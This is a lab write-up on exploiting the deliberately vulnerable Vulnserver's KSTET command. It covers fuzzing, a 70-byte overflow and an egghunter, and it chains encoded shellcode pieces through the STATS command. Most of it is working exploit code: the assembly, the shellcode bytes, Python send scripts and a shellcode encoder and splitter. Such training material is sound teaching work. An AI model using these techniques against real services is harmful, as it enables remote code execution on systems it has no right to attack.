# Vulnserver: KSTET Command

In this exercise we will be exploring Vulnserver's `KSTET` command.  

## Fuzz
We begin by using the same fuzzing script we've used previously:
```
#!/usr/bin/env python

from boofuzz import *

def main():
    c = SocketConnection("192.168.186.135", 9999, proto='tcp')
    t = Target(connection = c)
    s = Session(target=t)

    s_initialize(name="Request")

    with s_block("UA-Line"):
        s_string("KSTET", fuzzable=False)
        s_delim(" ", fuzzable=False, name='space-4')
        s_string("test", name='kstet-value')
        s_static("\r\n", "Request-CRLF")

    s.connect(s_get("Request"))

    s.fuzz()

if __name__ == "__main__":
    main()
```

We note that Vulnserver almost immediately crashes; the fuzzer identifies the
offending buffer as being 5,015 bytes long.  

## Crash
After confirming the crash with our own buffer, we pass a pattern string of
length 5,000.  The response is curious: the pattern in `EIP` is found at 
offset 70.  After further testing, we realize that we have a total of around 
105 bytes to work with before our input is truncated.  This is hardly enough 
space to do anything meaningful; the most compact Windows reverse shell is more 
than double that, and we'd still have to account for the jump over byte 70 as 
well as any character restrictions we identify.  

Fortunately, the only characters we find we need to avoid are \x00 and \x0a.  

## Buffer
Digging deeper, we find that we have enough room in our 70-byte buffer to
execute an egghunter:
```
[BITS 32]
mov esp, ebp
xor edx, edx
or dx,0xfff
inc edx
push edx
push byte +0x2
pop eax
int 0x2e
cmp al,0x5
pop edx
jz 0x4
mov eax,0x57303054
mov edi,edx
scasd
jnz 0x5
scasd
jnz 0x5
jmp edi
```

Here is a wrapper script to set the stack pointer, place the egghunter, and call
`JMP ESP`:
```
#!/usr/bin/env python

import sys
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

message  = "KSTET "
message += '\x90' * 8

buf  = "\x50\x5c"
buf += "\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58"
buf += "\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x41\x30\x30\x57" 
buf += "\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

message += buf
message += '\x42' * 26
message += '\xaf\x11\x50\x62' 
message += '\xeb\xbc'
message += "\n"

s.send(message)
s.close()
```

Inserting an egg to find, though, is another matter.  

### STATS Command
Branching out, we discover that the `STATS` command stores our output in
memory.  It itself does not appear to be vulnerable to a buffer overflow attack,
but if we can use it to insert our egg and payload, we can then overflow 
`KSTET` to fire off an egghunter.  

Complications quickly arise, however, when we realize that `STATS`, too, is
truncated after just around 100 bytes.  Thankfully, we are not limited in the
number of times we can use `STATS` to insert segments into memory.  

### Splitting Shellcode
We adapt the arithmetic encoder we've used previously to encode our shellcode
and push it onto the stack.  Since we were relatively unrestricted in our
character set, we modify the encoder to push the naked bytes in reverse order,
only resorting to carving the desired value out of a block of 0xFFFFFFFF when it
contains one of our forbidden characters.  

We also update the script to output shellcode instead of nasm, since it will
make the next step less complicated.
```
#!/usr/bin/env python
import sys

a_int = sorted(list(set(range(1, 255)) - set(['\x0a'])))

def findCombo(dword, three=False):
    global a_int
    
    group = "{:08x}".format(dword)
    if all([ (int(group[i:i+2], 16) in a_int) for i in range(0, len(group), 2) ]):
        return None

    matches = []
    carry = 0
    for x in range(0, 4):
        byte = (dword - (carry)) % 256

        found = False
        l = [(f1, f2) for f1 in a_int for f2 in a_int]
        if three:
            l = [(f1, f2, f3) for f1 in a_int for f2 in a_int for f3 in a_int]

        for i in l:
            if not found and (sum(i) % 256) == byte and len(set(i) - set(a_int)) == 0:
                found = True
                carry = (sum(i) >= 0x100)
                matches.append(i)
        dword >>= 8
    return matches

def main():
    if len(sys.argv) != 2:
        return 1

    args = ["{:02x}".format(ord(a)) for a in sys.argv[1][::-1]]
    chars = [args[i * 4:(i + 1) * 4] for i in range((len(args) + 4 - 1) // 4 )] 
    chars = ["".join(c) for c in chars]

    for group in chars:
        group += ('47' * (4 - (len(group)/2)))
        g = int(group, 16)
        ffg = int('ffffffff', 16) - g + 1
        ffg_h = "0x{:08x}".format(ffg)

        c = findCombo(ffg)
        if c is None:
            hg = "{:08x}".format(g)
            print "68{0}".format("".join([ hg[i:i+2] for i in range(len(hg)-2, -1, -2)]))

        else:
            f = ["".join(["{:02x}".format(j) for j in list(i)]) for i in zip(*c[::-1])]
            f_sum = "0x{:08x}".format(sum([int(i, 16) for i in f]) % (2**32))
            if (ffg_h != f_sum):
                c = findCombo(ffg, True)
                f = ["".join(["{:02x}".format(j) for j in list(i)]) for i in zip(*c[::-1])]
                f_sum = "0x{:08x}".format(sum([int(i, 16) for i in f]) % (2**32))

                if(ffg_h != f_sum):
                    print ("# {0} -> {1}".format(ffg_h, f_sum))
            clear = ["25{0}".format(i) for i in ("554e4d4a", "2a313235")]
            sub   = ["2d{0}".format(j) for j in f]
            push  = [ "50" ]
            print "".join(clear + sub + push)

    return 0

if __name__ == "__main__":
    sys.exit(main())
```

Next, we write a quick script to split the encoded shellcode into 90-byte
chunks.  Each chunk will be prepended with an egg and followed up by an
egghunter to look for the next section in the chain.  Note that the encoder
script prints one 'section' per line, where each section consists of either a
`PUSH <DWORD>` or a `AND/AND/SUB/SUB/PUSH` sequence.  By appending one of these
at a time until we've met our 90-byte limit, we ensure that we don't split the
chunks in the middle of an instruction.  We output this chain of
egghunter/shellcode pairs in the form of a python script:
```
#!/bin/bash

FILE=./shell-raw
CAVE_SIZE=96
EGG_BASE="00W"
EGG_SEQ=" ABCDEFGHIJKLMNOPQRSTUVWXYZ"

echo "#!/usr/bin/env python"
echo "import socket"
echo "import time"

C_COUNT=1
CAVE=""
for L in $(./encode.py "$(cat ${FILE})")
do
    NEW_C="${CAVE}${L}"
    if [ ${#NEW_C} -gt ${CAVE_SIZE} ]
    then
        EGG=$(echo -n "${EGG_SEQ:${C_COUNT}:1}${EGG_BASE}" | xxd -p)
        cat << EOF 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

message  = "STATS "
message += "/.:/ "

# Cave ${C_COUNT} (${EGG}):
$(echo -n "${EGG}${EGG}${CAVE}" | hex)

buf += "\x31\xd2\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58"
buf += "\xcd\x2e\x3c\x05\x5a\x74\xef\xb8${EGG_SEQ:$((C_COUNT + 1)):1}\x30\x30\x57" 
buf += "\x89\xd7\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

message += buf
message += '\n'
s.send(message)
s.close()
time.sleep(0.5)
EOF
        CAVE="${L}"
        C_COUNT=$((C_COUNT + 1))
    else
        CAVE=${NEW_C}
    fi
done

EGG=$(echo -n "${EGG_SEQ:${C_COUNT}:1}${EGG_BASE}" | xxd -p)
cat << EOF 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.186.135", 9999))

message  = "STATS "
message += "/.:/ "

# Cave ${C_COUNT} (${EGG}):
$(echo -n "${EGG}${EGG}${CAVE}" | hex)

message += buf
message += "\x68\x47\x47\x47\x47"
message += "\x68\x47\x47\x47\x47"
message += "\x68\x47\x47\x47\x47"
message += "\x68\x47\x47\x47\x47"
message += "\xff\xe4"
message += '\n'
s.send(message)
s.close()
EOF
```

It is necessary to call `time.sleep()` for a brief period between buffers to
ensure that the prior connection is closed before the next link is submitted,
lest we receive an error resulting in a missing link in our chain.

### Execution
When we execute the output of this script and follow it up with our `KSTET`
exploit, we see that the program's execution is redirected to the first
egghunter, which finds the egg `W00AW00A`, pushes a few lines of shellcode onto
the stack, and kicks off an egghunter in search of `W00BW00B`, and so on.
Finally, the last section pushes the tail of the shellcode onto the stack, pads
it with 16 `NOP`s, and jumps to the top of the stack to execute the final stage
of the payload.  
